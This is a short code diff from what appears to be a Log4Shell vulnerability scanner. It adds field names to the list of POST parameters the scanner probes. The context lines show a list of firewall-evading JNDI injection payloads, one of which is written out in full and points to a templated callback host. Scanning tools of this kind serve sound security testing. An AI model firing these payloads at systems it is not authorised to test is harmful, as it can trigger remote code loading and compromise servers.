@@ -47,7 +47,8 @@ default_headers = {
     # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
-post_data_parameters = ["username", "user", "email", "email_address", "password"]
+
+post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
 timeout = 4
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
